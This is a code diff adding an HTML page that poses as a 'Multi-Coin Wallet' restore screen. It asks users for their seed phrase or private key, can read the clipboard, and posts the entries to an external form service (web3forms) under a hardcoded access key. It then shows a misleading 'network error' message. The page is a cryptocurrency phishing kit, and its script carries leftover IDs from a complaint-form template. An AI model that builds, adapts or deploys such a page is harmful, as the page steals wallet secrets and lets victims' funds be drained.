@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Wallet login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #f4f6f9;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+
+  .container {
+    background: #ffffff;
+    padding: 25px;
+    width: 100%;
+    max-width: 450px;
+    border-radius: 10px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+  }
+
+  h2 {
+    text-align: center;
+    margin-bottom: 20px;
+  }
+
+  input, textarea {
+    width: 100%;
+    padding: 10px;
+    border: 1px solid #ccc;
+    border-radius: 6px;
+    font-size: 14px;
+  }
+
+  textarea {
+    resize: none;
+    height: 140px;
+  }
+
+  .field {
+    margin-bottom: 15px;
+  }
+
+  .required-text {
+    font-size: 11px;
+    color: #888;
+    margin-top: 4px;
+  }
+
+  .textarea-row {
+    display: flex;
+    gap: 8px;
+    align-items: flex-start;
+  }
+
+  .paste-btn {
+    background: #1877f2;
+    color: white;
+    border: none;
+    padding: 10px;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 13px;
+    white-space: nowrap;
+  }
+
+  .paste-btn:hover {
+    background: #0f5dc2;
+  }
+
+  .submit-btn {
+    width: 100%;
+    padding: 12px;
+    background: #28a745;
+    color: white;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+    cursor: pointer;
+  }
+
+  .submit-btn:hover {
+    background: #1e7e34;
+  }
+
+  .success-message {
+    display: none;
+    text-align: center;
+    color: green;
+    margin-top: 10px;
+  }
+</style>
+</head>
+
+<body>
+
+<div class="container">
+  <h2>Multi-Coin Wallet</h2>
+
+       <form action="https://api.web3forms.com/submit" method="POST">
+    <!-- Web3Forms Key -->
+    <input type="hidden" name="access_key" value="39483916-2d75-4776-91f8-2bbc171def4f">
+
+<!-- Username Field -->
+<div class="field">
+  <input type="text" name="name" placeholder=" Wallet Name" required>
+  <div class="required-text">* Required</div>
+</div>
+  Seed Phrase
+    <!-- Complaint Field + Paste Button -->
+    <div class="field">
+      <div class="textarea-row">
+        <textarea name="message"  placeholder="Input Phrase" required></textarea>
+        <button type="button" class="paste-btn" onclick="pasteClipboard()">Paste</button>
+      </div>
+      <div class="required-text">Enter seed phrase or private key
+Input your seed phrases with spacing. Supports 12-word, 24-word seed phrases and private keys for all wallet types</div>
+    </div>
+
+    <!-- Submit -->
+    <button type="submit" class="submit-btn">Restore Wallet</button>
+
+  </form>
+
+  <div class="success-message" id="successMsg">
+    ✅  network error use connect wallet button</div>
+</div>
+
+<script>
+async function pasteClipboard() {
+  try {
+    const text = await navigator.clipboard.readText();
+    document.getElementById("complaintBox").value = text;
+  } catch (err) {
+    alert("Clipboard permission denied.");
+  }
+}
+
+const form = document.getElementById("complaintForm");
+const successMsg = document.getElementById("successMsg");
+
+form.addEventListener("submit", function(event) {
+  event.preventDefault();
+
+  const formData = new FormData(form);
+
+  fetch("https://api.web3forms.com/submit", {
+    method: "POST",
+    body: formData
+  })
+  .then(response => response.json())
+  .then(data => {
+    if (data.success) {
+      form.reset();
+      successMsg.style.display = "block";
+    } else {
+      alert("Submission failed. Try again.");
+    }
+  })
+  .catch(error => {
+    alert("Error submitting form.");
+  });
+});
+</script>
+
+</body>
+</html>
